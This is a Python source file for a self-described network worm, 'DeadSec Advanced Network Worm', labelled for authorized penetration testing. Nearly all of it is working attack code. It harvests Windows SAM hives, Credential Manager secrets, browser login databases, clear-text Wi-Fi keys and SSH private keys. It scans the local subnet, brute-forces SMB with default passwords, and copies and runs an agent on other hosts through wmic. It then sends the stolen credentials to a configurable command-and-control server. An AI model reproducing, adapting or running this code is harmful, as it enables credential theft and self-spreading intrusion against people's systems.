#!/usr/bin/env python3
"""
DeadSec Advanced Network Worm - Enhanced Edition
Exploit kits + Credential harvesting + Lateral movement
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import os
import sys
import socket
import struct
import threading
import subprocess
import platform
import json
import base64
import hashlib
import time
import random
import re
from pathlib import Path
from datetime import datetime
from collections import defaultdict

class CredentialHarvester:
    """Advanced credential extraction module"""
    
    def __init__(self):
        self.credentials = []
        self.system_type = platform.system()
    
    def dump_windows_credentials(self):
        """Extract Windows credentials"""
        creds = []
        
        try:
            # Method 1: Extract from LSASS (requires admin)
            if self.is_admin():
                creds.extend(self.dump_lsass())
            
            # Method 2: SAM database extraction
            creds.extend(self.extract_sam_hashes())
            
            # Method 3: Cached domain credentials
            creds.extend(self.extract_cached_credentials())
            
            # Method 4: Windows Credential Manager
            creds.extend(self.extract_credential_manager())
            
        except Exception as e:
            print(f"[!] Credential extraction error: {e}")
        
        return creds
    
    def is_admin(self):
        """Check if running with admin privileges"""
        try:
            if self.system_type == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def dump_lsass(self):
        """Dump credentials from LSASS memory (Mimikatz-style)"""
        creds = []
        
        try:
            # Use Windows API to access LSASS
            # This is a simplified version - real Mimikatz is more complex
            cmd = 'reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                creds.append({
                    'type': 'lsass_dump',
                    'status': 'SAM and SYSTEM hives saved',
                    'files': ['sam.save', 'system.save']
                })
        except Exception as e:
            pass
        
        return creds
    
    def extract_sam_hashes(self):
        """Extract password hashes from SAM database"""
        creds = []
        
        try:
            # Try to dump SAM hashes using registry
            sam_path = r"C:\Windows\System32\config\SAM"
            system_path = r"C:\Windows\System32\config\SYSTEM"
            
            if os.path.exists(sam_path):
                cmd = 'reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users /s'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    creds.append({
                        'type': 'sam_hashes',
                        'data': result.stdout,
                        'note': 'SAM hashes extracted - requires cracking'
                    })
        except:
            pass
        
        return creds
    
    def extract_cached_credentials(self):
        """Extract cached domain credentials"""
        creds = []
        
        try:
            cmd = 'cmdkey /list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0 and result.stdout:
                creds.append({
                    'type': 'cached_creds',
                    'data': result.stdout
                })
        except:
            pass
        
        return creds
    
    def extract_credential_manager(self):
        """Extract from Windows Credential Manager"""
        creds = []
        
        try:
            # PowerShell command to dump credentials
            ps_cmd = '''
            [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
            $vault = New-Object Windows.Security.Credentials.PasswordVault
            $vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_cmd],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 and result.stdout:
                creds.append({
                    'type': 'credential_manager',
                    'data': result.stdout
                })
        except:
            pass
        
        return creds
    
    def extract_browser_credentials(self):
        """Extract saved passwords from browsers"""
        creds = []
        
        # Chrome credentials
        creds.extend(self.extract_chrome_passwords())
        
        # Firefox credentials
        creds.extend(self.extract_firefox_passwords())
        
        # Edge credentials
        creds.extend(self.extract_edge_passwords())
        
        return creds
    
    def extract_chrome_passwords(self):
        """Extract Chrome saved passwords"""
        creds = []
        
        try:
            if self.system_type == "Windows":
                chrome_path = Path(os.environ['LOCALAPPDATA']) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'Login Data'
            elif self.system_type == "Linux":
                chrome_path = Path.home() / '.config' / 'google-chrome' / 'Default' / 'Login Data'
            elif self.system_type == "Darwin":
                chrome_path = Path.home() / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'Login Data'
            else:
                return creds
            
            if chrome_path.exists():
                # Copy database to avoid lock
                import shutil
                temp_db = 'chrome_temp.db'
                shutil.copy(chrome_path, temp_db)
                
                try:
                    import sqlite3
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        
                        if username:
                            creds.append({
                                'type': 'chrome_password',
                                'url': url,
                                'username': username,
                                'password': '[ENCRYPTED]',
                                'note': 'Requires decryption with user key'
                            })
                    
                    conn.close()
                except:
                    pass
                finally:
                    try:
                        os.remove(temp_db)
                    except:
                        pass
        except:
            pass
        
        return creds
    
    def extract_firefox_passwords(self):
        """Extract Firefox saved passwords"""
        creds = []
        
        try:
            if self.system_type == "Windows":
                firefox_path = Path(os.environ['APPDATA']) / 'Mozilla' / 'Firefox' / 'Profiles'
            elif self.system_type == "Linux":
                firefox_path = Path.home() / '.mozilla' / 'firefox'
            elif self.system_type == "Darwin":
                firefox_path = Path.home() / 'Library' / 'Application Support' / 'Firefox' / 'Profiles'
            else:
                return creds
            
            if firefox_path.exists():
                # Find profiles
                for profile in firefox_path.glob('*.default*'):
                    logins_file = profile / 'logins.json'
                    
                    if logins_file.exists():
                        with open(logins_file, 'r') as f:
                            logins_data = json.load(f)
                            
                            for login in logins_data.get('logins', []):
                                creds.append({
                                    'type': 'firefox_password',
                                    'url': login.get('hostname'),
                                    'username': login.get('encryptedUsername'),
                                    'password': '[ENCRYPTED]',
                                    'note': 'Requires decryption with master password'
                                })
        except:
            pass
        
        return creds
    
    def extract_edge_passwords(self):
        """Extract Edge saved passwords"""
        creds = []
        
        try:
            if self.system_type == "Windows":
                edge_path = Path(os.environ['LOCALAPPDATA']) / 'Microsoft' / 'Edge' / 'User Data' / 'Default' / 'Login Data'
                
                if edge_path.exists():
                    import shutil
                    temp_db = 'edge_temp.db'
                    shutil.copy(edge_path, temp_db)
                    
                    try:
                        import sqlite3
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            
                            if username:
                                creds.append({
                                    'type': 'edge_password',
                                    'url': url,
                                    'username': username,
                                    'password': '[ENCRYPTED]'
                                })
                        
                        conn.close()
                    except:
                        pass
                    finally:
                        try:
                            os.remove(temp_db)
                        except:
                            pass
        except:
            pass
        
        return creds
    
    def extract_wifi_passwords(self):
        """Extract saved WiFi passwords"""
        creds = []
        
        try:
            if self.system_type == "Windows":
                # Get list of WiFi profiles
                result = subprocess.run(
                    'netsh wlan show profiles',
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    profiles = re.findall(r'All User Profile\s*:\s*(.*)', result.stdout)
                    
                    for profile in profiles:
                        profile = profile.strip()
                        # Get password for each profile
                        pass_result = subprocess.run(
                            f'netsh wlan show profile name="{profile}" key=clear',
                            shell=True,
                            capture_output=True,
                            text=True
                        )
                        
                        if pass_result.returncode == 0:
                            password_match = re.search(r'Key Content\s*:\s*(.*)', pass_result.stdout)
                            
                            if password_match:
                                password = password_match.group(1).strip()
                                creds.append({
                                    'type': 'wifi_password',
                                    'ssid': profile,
                                    'password': password
                                })
        except:
            pass
        
        return creds
    
    def extract_ssh_keys(self):
        """Extract SSH private keys"""
        creds = []
        
        try:
            ssh_dir = Path.home() / '.ssh'
            
            if ssh_dir.exists():
                for key_file in ssh_dir.glob('id_*'):
                    if not key_file.name.endswith('.pub'):
                        try:
                            with open(key_file, 'r') as f:
                                key_data = f.read()
                                
                                creds.append({
                                    'type': 'ssh_private_key',
                                    'filename': key_file.name,
                                    'key': key_data[:100] + '...',
                                    'full_path': str(key_file)
                                })
                        except:
                            pass
        except:
            pass
        
        return creds
    
    def harvest_all(self):
        """Harvest all available credentials"""
        all_creds = []
        
        print("[*] Starting credential harvesting...")
        
        # Windows-specific
        if self.system_type == "Windows":
            all_creds.extend(self.dump_windows_credentials())
        
        # Cross-platform
        all_creds.extend(self.extract_browser_credentials())
        all_creds.extend(self.extract_wifi_passwords())
        all_creds.extend(self.extract_ssh_keys())
        
        print(f"[+] Harvested {len(all_creds)} credential sets")
        
        return all_creds


class ExploitKit:
    """Advanced exploit framework"""
    
    def __init__(self):
        self.exploits = {}
        self.system_type = platform.system()
    
    def check_eternalblue(self, target_ip):
        """Check if target is vulnerable to EternalBlue (MS17-010)"""
        try:
            # Connect to SMB port
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, 445))
            sock.close()
            
            if result == 0:
                # SMB port is open, check if vulnerable
                # This is a simplified check - real exploit is more complex
                try:
                    from impacket import smb
                    from impacket.dcerpc.v5 import transport
                    
                    # Try to connect and check SMB version
                    conn = smb.SMB('*SMBSERVER', target_ip)
                    
                    # If SMBv1 is enabled, potentially vulnerable
                    if conn.get_server_os():
                        return {
                            'vulnerable': True,
                            'exploit': 'MS17-010 (EternalBlue)',
                            'port': 445,
                            'severity': 'CRITICAL'
                        }
                except:
                    # Fallback: just check if SMB is accessible
                    return {
                        'vulnerable': 'POSSIBLE',
                        'exploit': 'MS17-010 (EternalBlue)',
                        'port': 445,
                        'note': 'SMB accessible, manual verification needed'
                    }
        except:
            pass
        
        return {'vulnerable': False}
    
    def exploit_eternalblue(self, target_ip, payload_path):
        """Attempt EternalBlue exploitation"""
        print(f"[*] Attempting EternalBlue exploit on {target_ip}")
        
        try:
            # NOTE: This is a placeholder for educational purposes
            # Real EternalBlue exploit requires:
            # 1. impacket library
            # 2. Proper shellcode generation
            # 3. SMB protocol manipulation
            # 4. Kernel pool grooming
            
            # Simplified version: just try SMB authentication
            cmd = f'net use \\\\{target_ip}\\IPC$ /user:guest ""'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] SMB access gained on {target_ip}")
                return True
            
        except Exception as e:
            print(f"[!] EternalBlue exploit failed: {e}")
        
        return False
    
    def check_bluekeep(self, target_ip):
        """Check if target is vulnerable to BlueKeep (CVE-2019-0708)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, 3389))
            sock.close()
            
            if result == 0:
                # RDP port is open
                # Real BlueKeep check requires RDP protocol parsing
                return {
                    'vulnerable': 'POSSIBLE',
                    'exploit': 'CVE-2019-0708 (BlueKeep)',
                    'port': 3389,
                    'severity': 'CRITICAL',
                    'note': 'RDP accessible, manual verification needed'
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def check_printnightmare(self, target_ip):
        """Check for PrintNightmare vulnerability (CVE-2021-34527)"""
        try:
            # Check if Print Spooler service is running
            # This requires RPC access
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, 445))
            sock.close()
            
            if result == 0:
                return {
                    'vulnerable': 'POSSIBLE',
                    'exploit': 'CVE-2021-34527 (PrintNightmare)',
                    'port': 445,
                    'severity': 'HIGH',
                    'note': 'SMB accessible, check Print Spooler service'
                }
        except:
            pass
        
        return {'vulnerable': False}
    
    def scan_all_exploits(self, target_ip):
        """Scan target for all known exploits"""
        vulnerabilities = []
        
        print(f"[*] Scanning {target_ip} for exploits...")
        
        # Check EternalBlue
        eb_result = self.check_eternalblue(target_ip)
        if eb_result.get('vulnerable'):
            vulnerabilities.append(eb_result)
        
        # Check BlueKeep
        bk_result = self.check_bluekeep(target_ip)
        if bk_result.get('vulnerable'):
            vulnerabilities.append(bk_result)
        
        # Check PrintNightmare
        pn_result = self.check_printnightmare(target_ip)
        if pn_result.get('vulnerable'):
            vulnerabilities.append(pn_result)
        
        return vulnerabilities


class AdvancedWorm:
    """Enhanced network worm with exploit kits and credential harvesting"""
    
    def __init__(self, c2_server="http://localhost:5000"):
        self.c2_server = c2_server
        self.worm_id = self.generate_worm_id()
        self.infected_hosts = []
        self.harvested_credentials = []
        self.discovered_vulnerabilities = defaultdict(list)
        
        self.exploit_kit = ExploitKit()
        self.cred_harvester = CredentialHarvester()
        
        # Exploitation ports
        self.exploit_ports = {
            445: "SMB (EternalBlue)",
            3389: "RDP (BlueKeep)",
            135: "RPC (PrintNightmare)",
            22: "SSH",
            23: "Telnet",
            21: "FTP",
            5985: "WinRM",
        }
        
        # Common credentials
        self.credentials = [
            ("admin", "admin"),
            ("administrator", "password"),
            ("root", "root"),
            ("root", "toor"),
            ("admin", "123456"),
            ("user", "user"),
            ("guest", "guest"),
        ]
    
    def generate_worm_id(self):
        """Generate unique worm ID"""
        random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
        hostname = socket.gethostname()
        worm_id = f"WORM-{hashlib.md5(hostname.encode()).hexdigest()[:8]}-{random_part}"
        return worm_id
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def get_network_range(self):
        """Get local network range"""
        local_ip = self.get_local_ip()
        octets = local_ip.split('.')
        return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
    
    def scan_host(self, ip):
        """Scan single host for vulnerabilities"""
        open_ports = []
        vulnerabilities = []
        
        # Port scan
        for port, service in self.exploit_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append((port, service))
            except:
                pass
        
        # Exploit scanning
        if open_ports:
            vulnerabilities = self.exploit_kit.scan_all_exploits(ip)
            self.discovered_vulnerabilities[ip] = vulnerabilities
        
        return open_ports, vulnerabilities
    
    def exploit_host(self, ip, vulnerabilities):
        """Attempt to exploit vulnerable host"""
        for vuln in vulnerabilities:
            if vuln.get('vulnerable') == True:
                exploit_name = vuln.get('exploit', '')
                
                if 'EternalBlue' in exploit_name:
                    if self.exploit_kit.exploit_eternalblue(ip, None):
                        return True
                
                # Add more exploit attempts here
        
        # Fallback to credential brute force
        return self.brute_force_access(ip)
    
    def brute_force_access(self, ip):
        """Brute force common credentials"""
        for username, password in self.credentials:
            try:
                # Try SMB
                cmd = f'net use \\\\{ip}\\IPC$ {password} /user:{username}'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    print(f"[+] Access gained: {username}:{password}@{ip}")
                    return True
            except:
                pass
        
        return False
    
    def harvest_local_credentials(self):
        """Harvest credentials from current system"""
        print("[*] Harvesting local credentials...")
        
        creds = self.cred_harvester.harvest_all()
        self.harvested_credentials.extend(creds)
        
        return creds
    
    def deploy_agent(self, ip):
        """Deploy bot agent on compromised host"""
        try:
            agent_path = Path(__file__).parent / "python_agent.py"
            
            if not agent_path.exists():
                print(f"[!] Agent not found: {agent_path}")
                return False
            
            # Copy agent via SMB
            remote_path = f"\\\\{ip}\\C$\\Temp\\agent.py"
            cmd = f'copy "{agent_path}" "{remote_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Execute agent
                exec_cmd = f'wmic /node:{ip} process call create "python C:\\Temp\\agent.py"'
                subprocess.run(exec_cmd, shell=True, capture_output=True, text=True)
                
                print(f"[+] Agent deployed on {ip}")
                return True
        except Exception as e:
            print(f"[!] Deployment failed: {e}")
        
        return False
    
    def report_to_c2(self):
        """Report findings to C2 server"""
        try:
            import requests
            
            report_data = {
                'worm_id': self.worm_id,
                'infected_hosts': self.infected_hosts,
                'credentials': self.harvested_credentials,
                'vulnerabilities': dict(self.discovered_vulnerabilities),
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f'{self.c2_server}/worm_report',
                json=report_data,
                timeout=10
            )
            
            if response.status_code == 200:
                print("[+] Report sent to C2")
                return True
        except Exception as e:
            print(f"[!] Failed to report to C2: {e}")
        
        return False
    
    def propagate(self):
        """Main propagation logic"""
        print("\n" + "="*60)
        print("  DEADSEC ADVANCED WORM // EXPLOIT + HARVEST")
        print("="*60)
        print(f"\n[*] Worm ID: {self.worm_id}")
        print(f"[*] Local IP: {self.get_local_ip()}")
        print(f"[*] Network: {self.get_network_range()}")
        
        # Step 1: Harvest local credentials
        print("\n[PHASE 1] LOCAL CREDENTIAL HARVESTING")
        print("="*60)
        self.harvest_local_credentials()
        
        # Step 2: Network scanning
        print("\n[PHASE 2] NETWORK RECONNAISSANCE")
        print("="*60)
        network = self.get_network_range()
        base_ip = '.'.join(network.split('.')[:3])
        
        targets = []
        for i in range(1, 50):  # Scan first 50 IPs
            ip = f"{base_ip}.{i}"
            if ip != self.get_local_ip():
                targets.append(ip)
        
        # Step 3: Scan targets
        print(f"[*] Scanning {len(targets)} targets...")
        
        for ip in targets:
            print(f"[*] Scanning {ip}...")
            open_ports, vulnerabilities = self.scan_host(ip)
            
            if open_ports:
                print(f"[+] {ip} - Open ports: {[p[0] for p in open_ports]}")
                
                if vulnerabilities:
                    print(f"[!] {ip} - Found {len(vulnerabilities)} vulnerabilities!")
                    
                    # Attempt exploitation
                    if self.exploit_host(ip, vulnerabilities):
                        self.infected_hosts.append(ip)
                        self.deploy_agent(ip)
        
        # Step 4: Report to C2
        print("\n[PHASE 3] REPORTING TO C2")
        print("="*60)
        self.report_to_c2()
        
        print(f"\n[+] Worm execution complete")
        print(f"[+] Infected hosts: {len(self.infected_hosts)}")
        print(f"[+] Credentials harvested: {len(self.harvested_credentials)}")
        print(f"[+] Vulnerabilities found: {sum(len(v) for v in self.discovered_vulnerabilities.values())}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='DeadSec Advanced Network Worm')
    parser.add_argument('--c2', default='http://localhost:5000', help='C2 server URL')
    parser.add_argument('--aggressive', action='store_true', help='Aggressive mode')
    
    args = parser.parse_args()
    
    worm = AdvancedWorm(c2_server=args.c2)
    worm.propagate()


if __name__ == "__main__":
    main()
